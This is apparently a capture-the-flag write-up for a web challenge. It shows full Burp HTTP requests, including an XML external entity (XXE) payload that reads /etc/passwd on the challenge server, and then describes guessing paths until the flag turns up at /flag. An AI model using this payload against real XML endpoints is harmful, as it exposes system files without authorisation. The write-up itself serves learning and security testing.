After analysing the code we notice that the application works with both json and xml.
Since the title of the page says "xxe" we will try to read the flag at /web_xxe/flag using an entity injection.
This is the request we will use with burpsuite:


POST /api/order HTTP/1.1
Host: 178.62.39.119:30757
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.39.119:30757/
Content-Type: application/xml
Origin: http://178.62.39.119:30757
Content-Length: 103
Connection: close

<?xml version='1.0'?> 
<document>
 <food>WAFfles</food>
 <table_num>d0pey</table_num>

</document>

Using the source: https://portswigger.net/web-security/xxe

POST /api/order HTTP/1.1
Host: 178.62.39.119:30757
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.39.119:30757/
Content-Type: application/xml
Origin: http://178.62.39.119:30757
Content-Length: 163
Connection: close

<?xml version='1.0'?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<document>
 <food>&xxe;</food>
 <table_num>d0pey</table_num>

</document>

THis works!!!
We can then proceed to try and read the flag. We dont know where the flag is, we can try a bunch of things such as /var/www/html/flag, /home/www/flag, /www/flag.
After sometime i forget about a place, / "root" directory. After /flag we got the flag.

